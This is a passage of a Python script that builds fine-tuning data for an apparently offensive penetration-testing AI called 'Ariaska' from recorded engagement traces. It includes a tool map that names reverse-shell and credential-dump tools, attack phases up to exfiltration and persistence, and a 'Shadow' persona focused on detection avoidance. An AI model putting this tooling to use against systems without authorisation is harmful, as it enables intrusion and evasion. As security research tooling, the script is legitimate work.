#!/usr/bin/env python3
"""V3 Dataset Extraction — Production-grade training data for Ariaska fine-tuning.

Major improvements over V2:
  - Fixes decision source leakage in next_step reasoning
  - 500+ evidence_check samples (from 13) via postmortem mining + synthetic
  - 500+ retrieval_reasoning samples (from 13) via knowledge corpus
  - Knowledge corpus integration (107K entries → training samples)
  - Agent identity in system prompts (Scout/Red/Blue/Shadow/Orion)
  - Minimum 1000 samples per task family
  - Stricter quality filtering (MIN_QUALITY=0.6)
  - Diverse IP ranges and target profiles
  - Service-specific attack chain reasoning

Output: ariaska_ai/dataset/v3/ directory with per-task and split JSONL files.
"""

from __future__ import annotations

import ast
import json
import hashlib
import random
import re
from pathlib import Path
from dataclasses import dataclass, field
from typing import Any

# ── Paths ────────────────────────────────────────────────────────────────────
TRACE_DIR = Path(__file__).resolve().parents[2] / "traces"
POSTMORTEM_DIR = Path(__file__).resolve().parents[2] / "postmortems"
KNOWLEDGE_DIR = Path(__file__).resolve().parents[2] / "data" / "knowledge_candidates_v2"
OUTPUT_DIR = Path(__file__).resolve().parents[1] / "dataset" / "v3"
SEED = 42
MAX_PER_TASK = 5000
MIN_QUALITY = 0.6
MIN_PER_TASK = 2000  # Floor — augment until met

PHASES = [
    "RECON", "ENUMERATION", "EXPLOITATION", "PRIVILEGE_ESCALATION",
    "LATERAL_MOVEMENT", "POST_EXPLOITATION", "EXFILTRATION", "CLOSEOUT",
]

PHASE_OBJECTIVES = {
    "RECON": "network discovery, port scanning, host enumeration",
    "ENUMERATION": "service fingerprinting, version detection, directory/file discovery, vulnerability scanning",
    "EXPLOITATION": "exploiting vulnerabilities, gaining initial access, credential exploitation",
    "PRIVILEGE_ESCALATION": "escalating privileges, exploiting SUID/capabilities/misconfigs, getting root",
    "LATERAL_MOVEMENT": "pivoting to other hosts, credential reuse, tunnel establishment",
    "POST_EXPLOITATION": "data collection, flag capture, persistence, file exfiltration",
    "EXFILTRATION": "extracting flags, proof of access, data exfiltration",
    "CLOSEOUT": "cleanup, documentation, final verification",
}

PHASE_TRANSITIONS = [
    ("RECON", "ENUMERATION"),
    ("ENUMERATION", "EXPLOITATION"),
    ("EXPLOITATION", "PRIVILEGE_ESCALATION"),
    ("PRIVILEGE_ESCALATION", "LATERAL_MOVEMENT"),
    ("PRIVILEGE_ESCALATION", "POST_EXPLOITATION"),
    ("LATERAL_MOVEMENT", "POST_EXPLOITATION"),
    ("POST_EXPLOITATION", "EXFILTRATION"),
    ("EXFILTRATION", "CLOSEOUT"),
]

TOOL_CATEGORIES = {
    "nmap": "network_scanning", "masscan": "network_scanning", "rustscan": "network_scanning",
    "nikto": "web_scanning", "gobuster": "web_discovery", "dirb": "web_discovery",
    "ffuf": "web_fuzzing", "wfuzz": "web_fuzzing", "feroxbuster": "web_discovery",
    "hydra": "brute_force", "medusa": "brute_force", "john": "password_cracking",
    "hashcat": "password_cracking",
    "sqlmap": "sql_injection", "curl": "web_interaction", "wget": "web_interaction",
    "ssh": "remote_access", "ftp": "file_transfer", "smbclient": "smb_access",
    "enum4linux": "smb_enumeration", "crackmapexec": "network_attack", "cme": "network_attack",
    "msfconsole": "exploitation_framework", "searchsploit": "exploit_search",
    "tshark": "packet_analysis", "tcpdump": "packet_analysis",
    "linpeas": "privilege_escalation", "winpeas": "privilege_escalation",
    "getcap": "capability_check", "find": "file_search",
    "cat": "file_read", "id": "user_check", "whoami": "user_check",
    "sudo": "privilege_check", "python3": "scripting", "python": "scripting",
    "nc": "reverse_shell", "ncat": "reverse_shell", "socat": "reverse_shell",
    "chisel": "tunneling", "ligolo": "tunneling", "proxychains": "tunneling",
    "impacket-smbserver": "smb_relay", "secretsdump.py": "credential_dump",
    "bloodhound": "ad_enumeration", "ldapsearch": "ldap_enumeration",
    "wpscan": "wordpress_scanning", "nuclei": "vuln_scanning",
}

# Agent identities for conditioning
AGENT_ROLES = {
    "ScoutAgent": {
        "prefix": "You are Ariaska/Scout, the reconnaissance specialist.",
        "phases": ["RECON", "ENUMERATION"],
        "focus": "discovery, scanning, enumeration",
    },
    "RedAgent": {
        "prefix": "You are Ariaska/Red, the offensive exploitation specialist.",
        "phases": ["EXPLOITATION", "PRIVILEGE_ESCALATION"],
        "focus": "exploitation, credential attacks, privilege escalation",
    },
    "BlueAgent": {
        "prefix": "You are Ariaska/Blue, the defensive and validation specialist.",
        "phases": ["RECON", "ENUMERATION", "EXPLOITATION"],
        "focus": "defense validation, evidence checking, safe operations",
    },
    "ShadowAgent": {
        "prefix": "You are Ariaska/Shadow, the stealth and evasion specialist.",
        "phases": ["EXPLOITATION", "LATERAL_MOVEMENT", "POST_EXPLOITATION"],
        "focus": "stealth operations, detection avoidance, covert access",
    },
    "OrionAgent": {
        "prefix": "You are Ariaska/Orion, the strategic coordination specialist.",
        "phases": ["RECON", "EXPLOITATION", "PRIVILEGE_ESCALATION", "POST_EXPLOITATION"],
        "focus": "strategic planning, phase transitions, engagement analysis",
    },
}

# Diverse IP ranges for training variety
IP_RANGES = [
    "10.10.10.{}", "10.129.{}.{}", "172.28.0.{}", "172.16.0.{}", "192.168.1.{}",
    "10.0.0.{}", "10.200.{}.{}", "192.168.56.{}", "172.20.0.{}", "10.150.{}.{}",
]

# ── System Prompts with Agent Identity ────────────────────────────────────────

def _sys(task: str, agent: str | None = None) -> str:
    """Build system prompt with optional agent identity."""
    prompts = {
        "phase_classification": (
            "{agent_prefix} Cybersecurity AI coprocessor for authorized penetration testing. "
            "Classify the current attack phase from the engagement state. "
            'Respond in JSON: {{"phase": "<PHASE>", "confidence": <0.0-1.0>, "reasoning": "<brief>"}}'
        ),
        "next_step": (
            "{agent_prefix} Cybersecurity AI coprocessor. Given the engagement state, "
            "suggest the best next action. Respond in JSON:\n"
            '{{"action": "<exact command>", "reasoning": "<tactical justification>", '
            '"phase_fit": <0.0-1.0>, "alternatives": ["<alt1>", "<alt2>"]}}'
        ),
        "tool_output_parse": (
            "{agent_prefix} Cybersecurity AI coprocessor. Parse the tool output into structured findings. "
            "Respond in JSON:\n"
            '{{"discoveries": [{{"type": "<port|service|version|credential|vuln|shell|file|user>", '
            '"value": "<finding>", "confidence": <0.0-1.0>}}], '
            '"phase_impact": "<stay|advance>", "summary": "<brief>"}}'
        ),
        "state_summary": (
            "{agent_prefix} Cybersecurity AI coprocessor. Summarize the engagement state concisely. "
            "Respond in JSON:\n"
            '{{"phase": "<current>", "discoveries": {{"ports": [], "services": [], '
            '"credentials": [], "vulns": [], "shells": []}}, '
            '"progress": "<good|moderate|stalled>", "blockers": [], "next_priority": "<action>"}}'
        ),
        "retry_or_pivot": (
            "{agent_prefix} Cybersecurity AI coprocessor. A command failed or was unproductive. "
            "Decide the next move. Respond in JSON:\n"
            '{{"decision": "RETRY|PIVOT|ESCALATE", "action": "<next command>", '
            '"reasoning": "<why>", "confidence": <0.0-1.0>}}'
        ),
        "postmortem": (
            "{agent_prefix} Cybersecurity AI coprocessor. Analyze the completed engagement. "
            "Respond in JSON:\n"
            '{{"root_cause": "<what blocked progress>", "missed_signals": ["<signal>"], '
            '"corrected_path": ["<step>"], "key_lesson": "<brief>"}}'
        ),
        "command_validate": (
            "{agent_prefix} Cybersecurity AI coprocessor. Validate this command for the current state. "
            "Respond in JSON:\n"
            '{{"valid": true|false, "reasoning": "<why>", "alternative": "<better command if invalid>"}}'
        ),
        "evidence_check": (
            "{agent_prefix} Cybersecurity AI coprocessor. Given the current evidence and target state, "
            "determine if the evidence is sufficient to proceed. Respond in JSON:\n"
            '{{"sufficient": true|false, "missing": ["<what\'s needed>"], '
            '"confidence": <0.0-1.0>, "recommendation": "<brief>"}}'
        ),
        "retrieval_reasoning": (
            "{agent_prefix} Cybersecurity AI coprocessor. Using the current state plus retrieved "
            "prior experience, synthesize tactical guidance. Respond in JSON:\n"
            '{{"synthesis": "<integrated reasoning>", "from_current": "<what current state shows>", '
            '"from_memory": "<what prior experience suggests>", "action": "<recommended command>", '
            '"confidence": <0.0-1.0>}}'
        ),
    }
    agent_prefix = ""
    if agent and agent in AGENT_ROLES:
        agent_prefix = AGENT_ROLES[agent]["prefix"]
    else:
        agent_prefix = "You are Ariaska, a"
    return prompts[task].format(agent_prefix=agent_prefix)


def _pick_agent(phase: str, task: str) -> str:
    """Pick the most fitting agent for a given phase and task."""
    if task == "postmortem":
        return "OrionAgent"
    if task == "evidence_check":
        return "BlueAgent"
    if task == "state_summary":
        return "OrionAgent"

    phase_agents = []
    for name, info in AGENT_ROLES.items():
        if phase in info["phases"]:
            phase_agents.append(name)
    if phase_agents:
        return random.choice(phase_agents)
    return random.choice(list(AGENT_ROLES.keys()))


def _rand_ip() -> str:
    """Generate a random diverse IP."""
    template = random.choice(IP_RANGES)
    return template.format(
        random.randint(1, 254),
        random.randint(1, 254),
    )


@dataclass
class Sample:
    task: str
    messages: list[dict]
    metadata: dict = field(default_factory=dict)
    quality: float = 0.5

    def to_dict(self) -> dict:
        return {
            "messages": self.messages,
            "task_family": self.task,
            "metadata": self.metadata,
            "quality_score": round(self.quality, 3),
        }

    def content_hash(self) -> str:
        # Hash both user prompt and assistant response to preserve IP/context variation
        parts = []
        for m in self.messages:
            if m["role"] in ("user", "assistant"):
                parts.append(m["content"])
        text = "|||".join(parts)
        return hashlib.md5(text.encode()).hexdigest()


# ── Data Loading ──────────────────────────────────────────────────────────────

def load_all_traces() -> list[tuple[str, list[dict]]]:
    """Load all trace event files, return (filename, steps) pairs."""
    traces = []
    event_files = sorted(TRACE_DIR.glob("events_*.jsonl"))
    for ef in event_files:
        steps = []
        try:
            with open(ef) as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    d = json.loads(line)
                    if d.get("kind") == "step":
                        steps.append(d)
        except (json.JSONDecodeError, OSError):
            continue
        if steps:
            traces.append((ef.name, steps))
    return traces


def load_all_postmortems() -> list[dict]:
    """Load all postmortem JSON files."""
    pms = []
    for pf in sorted(POSTMORTEM_DIR.glob("postmortem_*.json")):
        try:
            with open(pf) as f:
                data = json.load(f)
            if data and isinstance(data, dict):
                pms.append(data)
        except (json.JSONDecodeError, OSError):
            continue
    return pms


def load_knowledge(categories: list[str] | None = None) -> list[dict]:
    """Load knowledge corpus entries."""
    entries = []
    if not KNOWLEDGE_DIR.exists():
        return entries
    files = sorted(KNOWLEDGE_DIR.glob("*.jsonl"))
    for f in files:
        if categories and f.stem not in categories:
            continue
        try:
            with open(f) as fh:
                for line in fh:
                    line = line.strip()
                    if not line:
                        continue
                    d = json.loads(line)
                    if d.get("title") and d.get("summary"):
                        entries.append(d)
        except (json.JSONDecodeError, OSError):
            continue
    return entries


def extract_agent_record(step: dict) -> dict | None:
    """Get the primary agent record from a step."""
    records = step.get("agent_records", [])
    if not records:
        return None
    return max(records, key=lambda r: r.get("reward", 0))


def build_evidence_snapshot(steps: list[dict], up_to: int) -> dict:
    """Build cumulative evidence from steps[0:up_to]."""
    evidence: dict[str, set] = {
        "ports": set(), "services": set(), "credentials": set(),
        "vulns": set(), "shells": set(), "users": set(),
        "files": set(), "versions": set(),
    }
    for s in steps[:up_to]:
        for rec in s.get("agent_records", []):
            for d in rec.get("discoveries", []):
                if isinstance(d, str):
                    dtype = d.split(":")[0].lower() if ":" in d else "other"
                    val = d.split(":", 1)[1] if ":" in d else d
                    if "port" in dtype:
                        evidence["ports"].add(val.strip())
                    elif "service" in dtype or "version" in dtype:
                        evidence["services"].add(val.strip())
                    elif "cred" in dtype or "password" in dtype:
                        evidence["credentials"].add(val.strip())
                    elif "vuln" in dtype:
                        evidence["vulns"].add(val.strip())
                    elif "shell" in dtype:
                        evidence["shells"].add(val.strip())
                    elif "user" in dtype:
                        evidence["users"].add(val.strip())
                    elif "file" in dtype or "sensitive" in dtype:
                        evidence["files"].add(val.strip())
                    else:
                        evidence["versions"].add(val.strip())
    return {k: sorted(v)[:10] for k, v in evidence.items()}


def build_context_str(step: dict, steps: list[dict], idx: int) -> str:
    """Build rich context string from step and history."""
    parts = []
    phase = step.get("phase_before", step.get("phase_after", "RECON"))
    parts.append(f"Phase: {phase}")

    target = step.get("target_ip", "")
    if target:
        parts.append(f"Target: {target}")

    parts.append(f"Step: {step.get('step_num', idx)}/{len(steps)}")
    parts.append(f"Episode reward so far: {step.get('episode_reward_so_far', 0):.1f}")

    ev = build_evidence_snapshot(steps, idx)
    for k, v in ev.items():
        if v:
            parts.append(f"{k.capitalize()}: {', '.join(str(x) for x in v[:5])}")

    recent = []
    for s in steps[max(0, idx - 5):idx]:
        rec = extract_agent_record(s)
        if rec:
            agent = rec.get("agent_name", "?")
            cmd = rec.get("command", "")[:100]
            rew = rec.get("reward", 0)
            recent.append(f"  {agent}: {cmd} (reward: {rew:.1f})")
    if recent:
        parts.append("Recent actions:\n" + "\n".join(recent))

    return "\n".join(parts)


def quality_score(step: dict, record: dict) -> float:
    """Score sample quality 0.0-1.0 based on signal richness."""
    score = 0.3
    reward = record.get("reward", 0)
    if reward > 20:
        score += 0.3
    elif reward > 5:
        score += 0.2
    elif reward > 0:
        score += 0.1

    if record.get("discoveries"):
        score += 0.15
    if record.get("reward_breakdown"):
        score += 0.05

    cmd = record.get("command", "")
    if cmd and len(cmd) > 5:
        score += 0.1
    if record.get("stdout_snippet"):
        score += 0.1

    return min(1.0, score)


def _clean_reasoning(text: str) -> str:
    """Remove decision source leakage from reasoning text."""
    # Strip internal scoring language
    text = re.sub(r"Using (?:ppo|mentor|playbook|registry|codex_meta|reflex|micro_chain|phase_guided|sac|cognition):\s*", "", text)
    text = re.sub(r"scored well on [^.]+\.\s*", "", text)
    text = re.sub(r"scored well on [^,]+(?:,\s*[^,]+)*", "", text)
    text = re.sub(r"\(score:?\s*[\d.]+\)", "", text)
    text = re.sub(r"base \([\d.]+\)", "", text)
    text = re.sub(r"novelty \([\d.]+\)", "", text)
    text = re.sub(r"phase_fit \([\d.]+\)", "", text)
    text = text.strip()
    if not text:
        return ""
    return text


# ══════════════════════════════════════════════════════════════════════════════
# SAMPLE GENERATORS — REAL DATA
# ══════════════════════════════════════════════════════════════════════════════

def gen_phase_classification(traces: list[tuple[str, list[dict]]]) -> list[Sample]:
    """Phase classification from real trace steps."""
    samples = []
    for fname, steps in traces:
        for i, step in enumerate(steps):
            phase = step.get("phase_after", step.get("phase_before", "RECON"))
            if phase not in PHASES:
                continue
            rec = extract_agent_record(step)
            if not rec:
                continue

            ctx = build_context_str(step, steps, i)
            q = quality_score(step, rec)
            agent = _pick_agent(phase, "phase_classification")

            ev = build_evidence_snapshot(steps, i + 1)
            reasoning_parts = []
            if ev["shells"]:
                reasoning_parts.append("shell access obtained")
            if ev["credentials"]:
                reasoning_parts.append(f"credentials found ({len(ev['credentials'])})")
            if ev["services"]:
                reasoning_parts.append(f"services enumerated ({len(ev['services'])})")
            if ev["ports"]:
                reasoning_parts.append(f"ports discovered ({len(ev['ports'])})")

            cmd = rec.get("command", "")
            tool = cmd.split()[0] if cmd else "unknown"
            tool_cat = TOOL_CATEGORIES.get(tool, "other")
            reasoning_parts.append(f"current tool ({tool}) is {tool_cat}")

            reasoning = "; ".join(reasoning_parts) if reasoning_parts else f"consistent with {phase} objectives"
            confidence = min(1.0, 0.5 + rec.get("reward", 0) / 40.0)

            response = json.dumps({
                "phase": phase,
                "confidence": round(confidence, 2),
                "reasoning": reasoning,
            })

            samples.append(Sample(
                task="phase_classification",
                messages=[
                    {"role": "system", "content": _sys("phase_classification", agent)},
                    {"role": "user", "content": f"Classify the attack phase:\n\n{ctx}"},
                    {"role": "assistant", "content": response},
                ],
                metadata={"phase": phase, "step": i, "agent": agent, "source": fname},
                quality=q,
            ))
    return samples


def gen_next_step(traces: list[tuple[str, list[dict]]]) -> list[Sample]:
    """Next-step suggestions from successful steps — CLEANED of decision source leakage."""
    samples = []
    for fname, steps in traces:
        for i, step in enumerate(steps):
            rec = extract_agent_record(step)
            if not rec:
                continue
            reward = rec.get("reward", 0)
            cmd = rec.get("command", "")
            if not cmd or reward < 2.0:
                continue

            phase = step.get("phase_before", "RECON")
            ctx = build_context_str(step, steps, i)
            q = quality_score(step, rec)
            agent = _pick_agent(phase, "next_step")

            # Build CLEAN tactical reasoning — no decision source leakage
            ev = build_evidence_snapshot(steps, i)
            reasoning_parts = []

            # Explain why this command makes sense given evidence
            tool = cmd.split()[0] if cmd else ""
            tool_cat = TOOL_CATEGORIES.get(tool, "other")

            if phase == "RECON":
                if tool_cat == "network_scanning":
                    reasoning_parts.append("network scanning to discover live hosts and open ports")
                else:
                    reasoning_parts.append(f"{tool_cat} to expand attack surface knowledge")
            elif phase == "ENUMERATION":
                if ev["ports"]:
                    reasoning_parts.append(f"enumerating services on discovered ports ({', '.join(ev['ports'][:3])})")
                else:
                    reasoning_parts.append("service enumeration to identify exploitable targets")
            elif phase == "EXPLOITATION":
                if ev["vulns"]:
                    reasoning_parts.append(f"exploiting identified vulnerability: {ev['vulns'][0][:50]}")
                elif ev["credentials"]:
                    reasoning_parts.append(f"leveraging discovered credentials for access")
                else:
                    reasoning_parts.append("attempting exploitation based on enumeration findings")
            elif phase == "PRIVILEGE_ESCALATION":
                if ev["shells"]:
                    reasoning_parts.append("escalating from user shell to root access")
                reasoning_parts.append(f"checking {tool_cat} escalation vectors")
            else:
                reasoning_parts.append(f"{tool_cat} aligns with {phase.lower().replace('_', ' ')} objectives")

            # Add context about discoveries
            if ev["credentials"] and phase in ("EXPLOITATION", "LATERAL_MOVEMENT"):
                reasoning_parts.append(f"reusing {len(ev['credentials'])} discovered credential(s)")
            if ev["services"] and phase == "ENUMERATION":
                reasoning_parts.append(f"{len(ev['services'])} services warrant deeper probing")

            reasoning = "; ".join(reasoning_parts) if reasoning_parts else f"targets {PHASE_OBJECTIVES.get(phase, 'current objectives')}"
            phase_fit = min(1.0, reward / 25.0)

            # Build alternatives from nearby successful steps
            alts = []
            for j in range(max(0, i - 3), min(len(steps), i + 3)):
                if j == i:
                    continue
                alt_rec = extract_agent_record(steps[j])
                if alt_rec and alt_rec.get("reward", 0) > 0:
                    alt_cmd = alt_rec.get("command", "")
                    if alt_cmd and alt_cmd != cmd:
                        alts.append(alt_cmd[:150])
                if len(alts) >= 2:
                    break

            response = json.dumps({
                "action": cmd[:200],
                "reasoning": reasoning[:200],
                "phase_fit": round(phase_fit, 2),
                "alternatives": alts,
            })

            samples.append(Sample(
                task="next_step",
                messages=[
                    {"role": "system", "content": _sys("next_step", agent)},
                    {"role": "user", "content": f"Current engagement state:\n{ctx}\n\nSuggest the next action."},
                    {"role": "assistant", "content": response},
                ],
                metadata={"phase": phase, "reward": reward, "command": cmd[:100], "agent": agent, "source": fname},
                quality=q,
            ))
    return samples


def gen_tool_output_parse(traces: list[tuple[str, list[dict]]]) -> list[Sample]:
    """Tool output parsing from steps with stdout_snippet and discoveries."""
    samples = []
    for fname, steps in traces:
        for i, step in enumerate(steps):
            rec = extract_agent_record(step)
            if not rec:
                continue
            stdout = rec.get("stdout_snippet", "")
            discoveries = rec.get("discoveries", [])
            if not stdout or not discoveries:
                continue

            cmd = rec.get("command", "")
            phase = step.get("phase_before", "RECON")
            agent = _pick_agent(phase, "tool_output_parse")

            parsed = []
            for d in discoveries:
                if isinstance(d, str):
                    dtype = d.split(":")[0] if ":" in d else "other"
                    val = d.split(":", 1)[1] if ":" in d else d
                    dtype_mapped = dtype.replace("_info", "").replace("_found", "")
                    for check, mapped in [
                        ("port", "port"), ("service", "service"), ("version", "service"),
                        ("cred", "credential"), ("password", "credential"),
                        ("vuln", "vuln"), ("shell", "shell"),
                        ("file", "file"), ("sensitive", "file"), ("user", "user"),
                    ]:
                        if check in dtype_mapped:
                            dtype_mapped = mapped
                            break
                    parsed.append({
                        "type": dtype_mapped,
                        "value": val.strip(),
                        "confidence": round(rec.get("confidence", 0.8), 2),
                    })

            reward = rec.get("reward", 0)
            phase_impact = "advance" if reward > 15 else "stay"

            tool_name = cmd.split()[0] if cmd else "tool"
            response = json.dumps({
                "discoveries": parsed[:8],
                "phase_impact": phase_impact,
                "summary": f"Extracted {len(parsed)} finding(s) from {tool_name} — "
                           f"{', '.join(set(p['type'] for p in parsed[:4]))}",
            })

            q = min(1.0, quality_score(step, rec) + 0.15)

            samples.append(Sample(
                task="tool_output_parse",
                messages=[
                    {"role": "system", "content": _sys("tool_output_parse", agent)},
                    {"role": "user", "content": f"Parse this tool output:\n\nCommand: {cmd[:150]}\n\nOutput:\n{stdout[:800]}"},
                    {"role": "assistant", "content": response},
                ],
                metadata={"phase": phase, "tool": tool_name, "n_discoveries": len(parsed), "agent": agent, "source": fname},
                quality=q,
            ))
    return samples


def gen_state_summary(traces: list[tuple[str, list[dict]]]) -> list[Sample]:
    """State summarization at regular intervals."""
    samples = []
    for fname, steps in traces:
        for i in range(3, len(steps), 3):
            step = steps[i]
            phase = step.get("phase_after", step.get("phase_before", "RECON"))
            ev = build_evidence_snapshot(steps, i + 1)
            total_reward = step.get("episode_reward_so_far", 0)

            if total_reward > 50:
                progress = "good"
            elif total_reward > 10:
                progress = "moderate"
            else:
                progress = "stalled"

            blockers = []
            if phase in ("EXPLOITATION", "PRIVILEGE_ESCALATION") and not ev["credentials"] and not ev["vulns"]:
                blockers.append("No credentials or vulnerabilities discovered yet")
            if phase == "RECON" and i > 10 and not ev["ports"]:
                blockers.append("Port scanning not yielding results")

            if phase == "RECON" and not ev["services"]:
                next_priority = "Enumerate discovered services"
            elif phase == "ENUMERATION" and not ev["credentials"] and not ev["vulns"]:
                next_priority = "Search for credentials or exploitable vulnerabilities"
            elif phase == "EXPLOITATION" and not ev["shells"]:
                next_priority = "Attempt exploitation of discovered vulnerabilities"
            elif phase == "PRIVILEGE_ESCALATION":
                next_priority = "Check SUID, capabilities, sudo, cron for escalation paths"
            elif ev["shells"]:
                next_priority = "Capture flags and validate access"
            else:
                next_priority = f"Continue {PHASE_OBJECTIVES.get(phase, 'current phase objectives')}"

            ctx = build_context_str(step, steps, i)
            agent = _pick_agent(phase, "state_summary")

            response = json.dumps({
                "phase": phase,
                "discoveries": {k: v[:5] for k, v in ev.items()},
                "progress": progress,
                "blockers": blockers,
                "next_priority": next_priority,
            })

            q = 0.6 + (0.2 if ev["credentials"] or ev["shells"] else 0) + (0.1 if blockers else 0)

            samples.append(Sample(
                task="state_summary",
                messages=[
                    {"role": "system", "content": _sys("state_summary", agent)},
                    {"role": "user", "content": f"Summarize the engagement state:\n\n{ctx}"},
                    {"role": "assistant", "content": response},
                ],
                metadata={"phase": phase, "step": i, "reward_so_far": total_reward, "agent": agent, "source": fname},
                quality=min(1.0, q),
            ))
    return samples


def gen_retry_pivot(traces: list[tuple[str, list[dict]]]) -> list[Sample]:
    """Retry/pivot decisions from failure->success transitions."""
    samples = []
    for fname, steps in traces:
        for i in range(1, len(steps)):
            prev_rec = extract_agent_record(steps[i - 1])
            curr_rec = extract_agent_record(steps[i])
            if not prev_rec or not curr_rec:
                continue

            prev_reward = prev_rec.get("reward", 0)
            curr_reward = curr_rec.get("reward", 0)
            prev_cmd = prev_rec.get("command", "")
            curr_cmd = curr_rec.get("command", "")

            if not prev_cmd or not curr_cmd:
                continue
            if not (prev_reward <= 1.0 and curr_reward >= 3.0):
                continue

            prev_tool = prev_cmd.split()[0] if prev_cmd else ""
            curr_tool = curr_cmd.split()[0] if curr_cmd else ""
            phase = steps[i - 1].get("phase_before", "RECON")
            agent = _pick_agent(phase, "retry_or_pivot")

            if prev_tool == curr_tool:
                decision = "RETRY"
                reasoning = f"Retrying {curr_tool} with adjusted parameters to get better results"
            elif TOOL_CATEGORIES.get(prev_tool) == TOOL_CATEGORIES.get(curr_tool):
                decision = "PIVOT"
                reasoning = f"Pivoting from {prev_tool} to {curr_tool} within {TOOL_CATEGORIES.get(curr_tool, 'same')} category for fresh approach"
            else:
                decision = "ESCALATE"
                prev_cat = TOOL_CATEGORIES.get(prev_tool, prev_tool)
                curr_cat = TOOL_CATEGORIES.get(curr_tool, curr_tool)
                reasoning = f"Escalating from {prev_cat} to {curr_cat} — previous approach exhausted"

            ctx = build_context_str(steps[i - 1], steps, i - 1)
            confidence = min(1.0, curr_reward / 20.0)

            response = json.dumps({
                "decision": decision,
                "action": curr_cmd[:200],
                "reasoning": reasoning,
                "confidence": round(confidence, 2),
            })

            samples.append(Sample(
                task="retry_or_pivot",
                messages=[
                    {"role": "system", "content": _sys("retry_or_pivot", agent)},
                    {"role": "user", "content": (
                        f"This command was unproductive:\n"
                        f"Command: {prev_cmd[:150]}\n"
                        f"Reward: {prev_reward:.1f}\n\n"
                        f"State:\n{ctx}\n\nWhat should we do next?"
                    )},
                    {"role": "assistant", "content": response},
                ],
                metadata={"decision": decision, "prev_reward": prev_reward, "curr_reward": curr_reward, "agent": agent, "source": fname},
                quality=quality_score(steps[i], curr_rec),
            ))
    return samples


def gen_postmortem(postmortems: list[dict]) -> list[Sample]:
    """Postmortem analysis from real engagement data."""
    samples = []
    for pm in postmortems:
        if pm.get("model_used") == "offline":
            continue
        outcomes = pm.get("key_outcomes", {})
        if not outcomes:
            continue

        summary = outcomes.get("summary", "")
        wins = outcomes.get("wins", [])
        fails = outcomes.get("fails", [])
        skills = pm.get("skill_cards", [])
        experiments = pm.get("next_experiments", [])

        if not summary:
            continue

        user_prompt = (
            f"Analyze this penetration testing engagement:\n\n"
            f"Run: {pm.get('run_id', 'unknown')}\n"
            f"Summary: {summary}\n"
        )
        if wins:
            user_prompt += f"Successes: {'; '.join(wins[:5])}\n"
        if fails:
            user_prompt += f"Failures: {'; '.join(fails[:5])}\n"

        root_cause = fails[0] if fails else "Unable to advance past initial phase"

        missed = []
        for s in skills[:5]:
            if s.get("if_condition"):
                missed.append(s["if_condition"])

        corrected = []
        for e in experiments[:5]:
            title = e.get("title", "")
            if title:
                corrected.append(title)

        key_lesson = ""
        if skills:
            s = skills[0]
            if s.get("if_condition") and s.get("then_action"):
                key_lesson = f"When {s['if_condition']}: {s['then_action']}"
        if not key_lesson:
            key_lesson = summary[:100]

        response = json.dumps({
            "root_cause": root_cause[:200],
            "missed_signals": missed[:5],
            "corrected_path": corrected[:5],
            "key_lesson": key_lesson[:200],
        })

        q = 0.5
        if wins and fails:
            q = 0.8
        elif wins or fails:
            q = 0.6
        if skills:
            q += 0.1

        samples.append(Sample(
            task="postmortem",
            messages=[
                {"role": "system", "content": _sys("postmortem", "OrionAgent")},
                {"role": "user", "content": user_prompt},
                {"role": "assistant", "content": response},
            ],
            metadata={"run_id": pm.get("run_id", ""), "has_skills": bool(skills), "agent": "OrionAgent", "source": "postmortem"},
            quality=min(1.0, q),
        ))
    return samples


def gen_command_validate(traces: list[tuple[str, list[dict]]]) -> list[Sample]:
    """Command validation — valid and invalid examples with improved quality."""
    samples = []
    for fname, steps in traces:
        for i, step in enumerate(steps):
            rec = extract_agent_record(step)
            if not rec:
                continue
            cmd = rec.get("command", "")
            if not cmd:
                continue

            reward = rec.get("reward", 0)
            phase = step.get("phase_before", "RECON")
            ev = build_evidence_snapshot(steps, i)
            ctx = build_context_str(step, steps, i)
            agent = _pick_agent(phase, "command_validate")

            valid = reward > 0
            tool = cmd.split()[0] if cmd else ""
            tool_cat = TOOL_CATEGORIES.get(tool, "other")

            # Build more detailed reasoning
            reasoning_parts = []
            if valid:
                reasoning_parts.append(f"{tool} ({tool_cat}) is appropriate for {phase}")
                if phase == "RECON" and tool_cat in ("network_scanning", "web_discovery"):
                    reasoning_parts.append("reconnaissance tools align with discovery phase")
                elif phase == "EXPLOITATION" and tool_cat in ("exploitation_framework", "brute_force", "sql_injection"):
                    reasoning_parts.append("exploitation tool matches current phase objective")
                if ev["ports"] and "port" in cmd.lower():
                    reasoning_parts.append("targeting a known open port")
            else:
                reasoning_parts.append(f"{tool} ({tool_cat}) does not fit {phase} phase")
                if phase == "RECON" and tool_cat in ("privilege_escalation", "credential_dump"):
                    reasoning_parts.append("privilege escalation tools premature during reconnaissance")
                if not ev["ports"] and tool_cat != "network_scanning":
                    reasoning_parts.append("no ports discovered yet — should scan first")

            reasoning = "; ".join(reasoning_parts)

            result: dict[str, Any] = {"valid": valid, "reasoning": reasoning}
            if not valid:
                for j in range(max(0, i - 3), min(len(steps), i + 3)):
                    if j == i:
                        continue
                    alt_rec = extract_agent_record(steps[j])
                    if alt_rec and alt_rec.get("reward", 0) > 0:
                        result["alternative"] = alt_rec.get("command", "")[:150]
                        break
                else:
                    result["alternative"] = ""
            else:
                result["alternative"] = ""

            response = json.dumps(result)

            # Higher quality threshold for command_validate
            q = quality_score(step, rec)
            if valid and reward > 5:
                q = min(1.0, q + 0.1)  # Boost clearly valid commands
            elif not valid and reward < -2:
                q = min(1.0, q + 0.15)  # Boost clearly invalid commands

            samples.append(Sample(
                task="command_validate",
                messages=[
                    {"role": "system", "content": _sys("command_validate", agent)},
                    {"role": "user", "content": f"Validate this command:\nCommand: {cmd[:150]}\nPhase: {phase}\n\n{ctx}"},
                    {"role": "assistant", "content": response},
                ],
                metadata={"valid": valid, "phase": phase, "reward": reward, "agent": agent, "source": fname},
                quality=q,
            ))
    return samples


def gen_evidence_check(traces: list[tuple[str, list[dict]]]) -> list[Sample]:
    """Evidence sufficiency checks — MASSIVELY expanded."""
    samples = []
    for fname, steps in traces:
        prev_phase = None
        for i, step in enumerate(steps):
            phase = step.get("phase_after", step.get("phase_before", "RECON"))
            if prev_phase and phase != prev_phase:
                ev = build_evidence_snapshot(steps, i)
                ctx = build_context_str(step, steps, i)
                agent = _pick_agent(phase, "evidence_check")

                missing = []
                sufficient = True

                if phase == "ENUMERATION":
                    if not ev["ports"]:
                        missing.append("open port discovery")
                        sufficient = False
                elif phase == "EXPLOITATION":
                    if not ev["credentials"] and not ev["vulns"]:
                        missing.append("credentials or vulnerabilities")
                        sufficient = False
                    if not ev["services"]:
